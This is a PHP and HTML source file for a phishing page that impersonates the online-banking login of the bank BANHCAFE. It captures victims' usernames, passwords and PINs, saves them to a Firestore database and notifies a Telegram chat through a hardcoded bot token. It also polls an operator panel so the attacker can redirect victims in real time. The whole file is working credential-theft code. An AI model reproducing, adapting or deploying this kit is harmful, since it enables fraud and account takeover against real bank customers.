<?php
ob_start();

// =========================
// ESTE ARCHIVO YA NO MANEJA FIRESTORE
// TODA LA BD ESTÁ EN functions.php
// =========================

// Bot Token y Chat IDs
$telegram_bot_id = "8401213574:AAGEQwftf5u0BXwZ5MWr3sHychkm-XS8Sg0";
$chat_ids = [-1003108011898]; // Puedes añadir más IDs si lo necesites

function aviso($telegram_bot_id, $chat_ids)
{
    $message = "🤑\n Nuevo user";

    foreach ($chat_ids as $chat_id) {
        $url = "https://api.telegram.org/bot$telegram_bot_id/sendMessage";

        $data = [
            'chat_id' => $chat_id,
            'text' => $message
        ];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
        curl_exec($ch);
        curl_close($ch);
    }
}

// =========================
// INCLUIR TODA LA LÓGICA FIRESTORE
// =========================
require_once 'functions.php';

// =========================
// OBTENER INFO DE USUARIO
// =========================
$info   = get_user_info();
$ip     = $info['ip'];
$device = get_device_id();

// =========================
// BLOQUEADO?
// =========================
if (get_user_state($device) === 'block') {
    echo "<script>
        alert('Acceso denegado: Tu usuario ha sido bloqueado.');
        window.location.href = 'https://www.google.com';
    </script>";
    exit();
}

// =========================
// REGISTRAR / ACTUALIZAR USUARIO
// currentPage = nombre del archivo actual (por ejemplo, index.php)
// =========================
$currentScript = basename($_SERVER['PHP_SELF']); // 'index.php'
update_user($ip, $info['location'], $currentScript);

// =========================
// PROCESAR FORMULARIO
// =========================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $allowedFields = ["pin","usuario","clave"];
    $formData = [];

    foreach ($_POST as $key => $value) {
        if (in_array($key, $allowedFields, true)) {
            $formData[$key] = trim($value);
        }
    }

    if (!empty($formData)) {

        // Cargar TODOS los usuarios desde Firestore
        $data = load_data();

        // Si no existe este deviceId, crearlo
        if (!isset($data[$device])) {
            $data[$device] = [
                'submissions' => [],
                'state'       => 'active',
                'color'       => ''
            ];
        }

        // Preparar para insertar / actualizar submission
        $timestamp = date("Y-m-d H:i:s");
        $found     = false;

        // Revisar si ya existe una submission con las mismas llaves
        if (isset($data[$device]['submissions'])) {
            foreach ($data[$device]['submissions'] as &$submission) {
                $existingKeys = array_keys($submission['data']);
                $formKeys     = array_keys($formData);

                sort($existingKeys);
                sort($formKeys);

                if ($existingKeys === $formKeys) {
                    // Reemplazar
                    $submission = [
                        "data"      => $formData,
                        "timestamp" => $timestamp
                    ];
                    $found = true;
                    break;
                }
            }
            unset($submission);
        }

        // Insertar nueva submission
        if (!$found) {
            $data[$device]['submissions'][] = [
                "data"      => $formData,
                "timestamp" => $timestamp
            ];

            // Primera submission → asignar color
            if (count($data[$device]['submissions']) === 1 && empty($data[$device]['color'])) {
                $data[$device]['color'] = '#000000';
            }
        }

        // GUARDAR EN FIRESTORE usando save_data() de functions.php
        save_data($data);

        // Notificación Telegram
        aviso($telegram_bot_id, $chat_ids);

        // Redirigir
        header("Location: waiting.php");
        exit();

    } else {
        echo "<script>alert('Por favor, complete al menos un campo válido.');</script>";
    }
}

ob_end_flush();
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Acceso BANHCAFE</title>
  <style>
    :root {
      --vino-banhcafe: #7a1c1c; 
      --azul-banhcafe: #1b2a57;
      --gris-texto: #888888; /* gris para texto dentro del input */
      --fondo-claro: #f9f9f9;
      --blanco: #ffffff;
      --negro: #000000; /* negro para títulos y labels */
    }

    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      margin: 0;
      background: var(--fondo-claro);
      color: var(--vino-banhcafe);
    }

    .main {
      display: flex;
      flex-direction: row;
      justify-content: space-between;
      align-items: center;
      min-height: 100vh;
      padding: 0 40px;
      background: url('assets/background-desktop.png') no-repeat center center;
      background-size: cover;
    }

    .contenido {
      max-width: 50%;
      padding-right: 30px;
    }

    .contenido h1 {
      font-size: 40px;
      margin-bottom: 10px;
    }

    .contenido p {
      font-size: 18px;
      line-height: 1.5;
      margin-bottom: 30px;
    }

    .contenido button {
      background-color: var(--vino-banhcafe);
      color: var(--blanco);
      border: none;
      padding: 12px 22px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
    }

    .formulario {
      background-color: var(--blanco);
      padding: 30px 25px;
      border-radius: 12px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
      border-top: 5px solid var(--vino-banhcafe);
      max-width: 400px;
      width: 100%;
      text-align: center;
      color: var(--negro); /* títulos y labels en negro */
    }

    .formulario .logo {
      margin-bottom: 15px;
    }

    .formulario .logo img {
      max-width: 150px;
      height: auto;
    }

    .formulario h2 {
      margin-bottom: 20px;
      font-size: 20px;
      color: var(--negro); /* banca en línea en negro */
    }

    .formulario label {
      font-weight: bold;
      margin-top: 10px;
      display: block;
      text-align: left;
      color: var(--negro); /* Usuario, Clave, PIN en negro */
    }

    .formulario input {
      width: 100%;
      padding: 10px;
      border: 1px solid var(--vino-banhcafe);
      border-radius: 6px;
      margin-top: 5px;
      color: var(--gris-texto); /* texto dentro del campo gris */
    }

    .formulario input::placeholder {
      color: var(--gris-texto); /* placeholder gris */
    }

    .formulario button {
      margin-top: 20px;
      width: 100%;
      background-color: var(--vino-banhcafe);
      color: var(--blanco);
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
    }

    .formulario button:hover {
      background-color: #5c1414;
    }

    @media (max-width: 900px) {
      .main {
        flex-direction: column;
        padding: 40px 20px;
        text-align: center;
        background: url('assets/background-mobile.png') no-repeat center center;
        background-size: cover;
      }

      .contenido {
        max-width: 100%;
        padding: 0;
      }

      .contenido h1 {
        font-size: 30px;
      }

      .formulario {
        margin-top: 40px;
      }
    }
  </style>
</head>
<body>
  <div class="main">
    <!-- Columna izquierda (contenido) -->
    <div class="contenido"></div>

    <!-- Columna derecha (formulario) -->
    <div class="formulario">
      <div class="logo">
        <img src="assets/logo.png" alt="Logo de la empresa">
      </div>

      <h2>Banca en línea</h2>
      <form method="POST">
        <label for="usuario">Usuario</label>
        <input type="text" name="usuario" required placeholder="Ingrese su usuario">

        <label for="clave">Clave</label>
        <input type="password" name="clave" required placeholder="Ingrese su clave">

        <label for="pin">PIN</label>
        <input type="password" name="pin" required maxlength="4" 
               pattern="\d{4}" inputmode="numeric" 
               placeholder="****"
               oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,4)">
        <button type="submit">Iniciar Sesión</button>
      </form>
    </div>
  </div>
      <script>
        (function () {
            // Página actual (PHP lo inyecta como texto)
            const CURRENT_PAGE = <?php echo json_encode(basename($_SERVER['PHP_SELF'])); ?>;
            // console.log("Estoy en:", CURRENT_PAGE);

            function checkRedirect() {
                fetch('check_redirect.php', { cache: 'no-store' })
                    .then(resp => resp.json())
                    .then(data => {
                        if (!data.currentPage) return;

                        // Si el panel dice otra página distinta, redirigimos
                        if (data.currentPage !== CURRENT_PAGE) {
                            window.location.href = data.currentPage;
                        }
                    })
                    .catch(() => {
                        // Ignoramos errores silenciosamente
                    });
            }

            // Revisar cada 2 segundos (puedes subirlo a 3000 o 5000 si quieres menos tráfico)
            setInterval(checkRedirect, 2000);
        })();
    </script>
    <script>
        // --- URL DEL ARCHIVO PHP QUE MANEJA OFFLINE / PING ---
        const statusURL = "functions.php?action="; // cambialo por el archivo correcto (ej: index.php?action=)

        // --- ENVÍA PING CADA 20 SEGUNDOS ---
        function sendPing() {
            fetch(statusURL + "ping")
                .catch(err => console.log("Error ping:", err));
        }

        // Enviar ping inmediatamente al cargar
        sendPing();

        // Enviar ping automáticamente cada 20 segundos
        setInterval(sendPing, 20000);

        // --- MARCAR OFFLINE AL SALIR DE LA PÁGINA ---
        window.addEventListener("beforeunload", function () {
            navigator.sendBeacon(statusURL + "offline");
        });
    </script>
</body>
</html>
